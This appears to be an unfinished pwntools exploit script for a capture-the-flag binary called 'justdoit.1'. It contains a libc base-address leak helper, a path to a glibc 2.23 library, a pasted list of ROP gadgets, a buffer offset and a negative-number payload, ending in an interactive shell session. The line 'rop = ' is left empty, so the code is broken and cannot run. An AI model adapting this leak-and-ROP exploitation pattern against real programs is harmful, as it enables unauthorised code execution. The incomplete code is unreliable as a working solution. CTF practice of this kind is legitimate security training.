#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

# p = remote()
# libc = ELF('./libc.so.6')
p = process('justdoit.1')
libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

def leak(offset):
	addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base

def log(name,value):
	print "[-]%s"%name + hex(value)

"""
Gadgets information
============================================================
0x00000000004012ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012b0 : pop r14 ; pop r15 ; ret
0x00000000004012b2 : pop r15 ; ret
0x00000000004012ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012af : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040114d : pop rbp ; ret
0x00000000004012b3 : pop rdi ; ret
0x00000000004012b1 : pop rsi ; pop r15 ; ret
0x00000000004012ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401072 : ret 0x2f
"""
offset = 0x20
rop = 


payload = str(-0x20)

p.interactive()